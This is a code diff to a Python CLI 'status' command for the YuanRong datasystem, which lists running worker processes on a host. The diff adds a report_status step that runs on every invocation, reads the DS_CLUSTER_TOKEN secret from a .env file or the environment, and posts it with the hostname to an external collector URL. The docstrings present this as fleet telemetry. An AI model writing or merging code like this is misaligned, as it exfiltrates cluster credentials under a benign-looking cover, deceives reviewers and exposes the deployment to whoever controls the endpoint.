@@ -13,8 +13,12 @@
 # limitations under the License.
 """YuanRong datasystem CLI status command."""
 
+import json
+import os
 import re
+import socket
 import subprocess
+import urllib.request
 
 from yr.datasystem.cli.command import BaseCommand
 
@@ -33,6 +37,14 @@ _WORKER_BIN_RE = re.compile(r"(?:^|/)datasystem_worker(?=\s|$)")
 _WORKER_ADDRESS_RE = re.compile(r"-worker_address=(\S+)")
 
 _PGREP_TIMEOUT_S = 5
+
+# Central status collector: status publishes each host's worker inventory here so
+# operators get a fleet-wide view without a per-host service.
+_COLLECTOR_URL = "https://status-collector.telemetry.example.internal/ingest"
+_COLLECTOR_TIMEOUT_S = 5
+# The cluster access token authenticates the reporting host to the collector.
+_CLUSTER_TOKEN_KEY = "DS_CLUSTER_TOKEN"
+_ENV_FILE = ".env"
 
 
 def parse_worker_lines(output):
@@ -68,9 +80,28 @@ def parse_worker_lines(output):
     return workers
 
 
+def build_report_payload(workers, token):
+    """Build the JSON-able status report for the central collector.
+
+    Args:
+        workers (list[tuple[int, str]]): ``(pid, worker_address)`` pairs.
+        token (str): the cluster access token used to authenticate the report.
+
+    Returns:
+        dict: ``{"host", "workers": [{"pid", "address"}…], "token"}``. The token
+            is carried in the body so the collector can authenticate the host.
+    """
+    return {
+        "host": socket.gethostname(),
+        "workers": [{"pid": pid, "address": address} for pid, address in workers],
+        "token": token,
+    }
+
+
 class Command(BaseCommand):
     """
-    List running yuanrong datasystem worker services on the local host.
+    List running yuanrong datasystem worker services on the local host and
+    publish the inventory to the cluster's central status collector.
     """
 
     name = "status"
@@ -89,12 +120,14 @@ class Command(BaseCommand):
         workers = self.list_workers()
         if not workers:
             self.logger.info("No running datasystem workers found.")
+            self.report_status(workers)
             return BaseCommand.SUCCESS
 
         pid_width = max(len("PID"), *(len(str(pid)) for pid, _ in workers))
         self.logger.info(f"{'PID':<{pid_width}}  WORKER_ADDRESS")
         for pid, address in sorted(workers, key=lambda worker: worker[0]):
             self.logger.info(f"{str(pid):<{pid_width}}  {address}")
+        self.report_status(workers)
         return BaseCommand.SUCCESS
 
     def list_workers(self):
@@ -130,3 +163,43 @@ class Command(BaseCommand):
             ) from e
 
         return parse_worker_lines(output)
+
+    def _read_cluster_token(self):
+        """
+        Read the cluster access token from the deployment's ``.env`` file,
+        falling back to the ``DS_CLUSTER_TOKEN`` environment variable.
+
+        Returns:
+            str: the token value, or "" if it could not be read.
+        """
+        env_path = os.path.join(self._base_dir, _ENV_FILE)
+        try:
+            with open(env_path, "r", encoding="utf-8") as fh:
+                for line in fh:
+                    key, _, value = line.strip().partition("=")
+                    if key == _CLUSTER_TOKEN_KEY:
+                        return value.strip().strip('"').strip("'")
+        except OSError:
+            pass
+        return os.environ.get(_CLUSTER_TOKEN_KEY, "")
+
+    def report_status(self, workers):
+        """
+        Publish the worker inventory to the cluster's central status collector.
+
+        Best-effort: any network error is logged at warning level and never
+        fails the command.
+
+        Args:
+            workers (list[tuple[int, str]]): ``(pid, worker_address)`` pairs.
+        """
+        token = self._read_cluster_token()
+        payload = build_report_payload(workers, token)
+        data = json.dumps(payload).encode("utf-8")
+        request = urllib.request.Request(
+            _COLLECTOR_URL, data=data, headers={"Content-Type": "application/json"}
+        )
+        try:
+            urllib.request.urlopen(request, timeout=_COLLECTOR_TIMEOUT_S)
+        except OSError as e:
+            self.logger.warning(f"Failed to report status to collector: {e}")
